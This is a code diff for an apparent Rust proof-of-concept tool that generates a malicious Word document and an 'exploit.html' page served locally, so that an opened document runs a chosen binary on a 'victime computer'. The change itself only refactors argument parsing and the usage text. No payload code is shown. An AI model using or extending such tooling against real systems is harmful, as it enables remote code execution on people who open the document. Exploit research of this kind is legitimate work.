@@ -23,12 +23,22 @@ fn main() {
     println!("*                                                              *");
     println!("****************************************************************");
 
+    let params = [
+        "--manual",
+        "--server",
+        "--port",
+        "--webroot",
+        "--docx",
+        "--html",
+        "--help",
+        "-h",
+    ];
     let args: Vec<_> = std::env::args().collect();
-    let (vec_flag, _vec_args) = parse_args::parse_args(&args);
+    let (vec_flag, _vec_args) = parse_args::parse_args(&args, &params);
     if parse_args::get_flag_value("h", &vec_flag) == Some("".to_string())
         || parse_args::get_flag_value("help", &vec_flag) == Some("".to_string())
     {
-        usage(&args[0]);
+        parse_args::usage(&args[0]);
         exit(0);
     }
     let opt_docx = parse_args::get_flag_value("docx", &vec_flag);
@@ -144,33 +154,6 @@ Configuration:
             webroot, ip, port
         );
     }
-}
-
-fn usage(cmd: &str) {
-    println!(
-        "Usage: {} [Options]
-
-Options:
-        --server=interface  # Bind server to IP address of provided interface
-                            # Default value \"lo\"
-        --manual=ipadr      # Manual mode : Only generate docx and html files without binding a server
-                            # Default value \"127.0.0.1\"
-        --port=portnumber   # Bind server to provided port
-                            # Default value \"8080\"
-        --webroot=webpath   # Specify where files are generated
-                            # Default value \"./www\"
-        --html=filename     # Specify the name of the html generated file
-                            # Default value \"exploit.html\"
-        --docx=filename     # Specify the name of the docx generated file
-                            # Default value \"document.docx\"
-        --binary=binarypath # Make a payload to execue binarypath on the victime computer
-                            # Default value \"\\\\\\\\windows\\\\\\\\system32\\\\\\\\calc\"
-                            # Binary path should not include the file extention e.g. .exe
-                            # On linux binarypath should be double excaped:
-                            # e.g. \\\\\\\\windows\\\\\\\\system32\\\\\\\\calc
-                            # On windows binarypath should be excaped:
-                            # e.g. \\\\windows\\\\system32\\\\calc
-        -h or --help        # print this message ", cmd);
 }
 
 fn generate_docx(docx_name: String, payload_url: String, webroot: &str) {
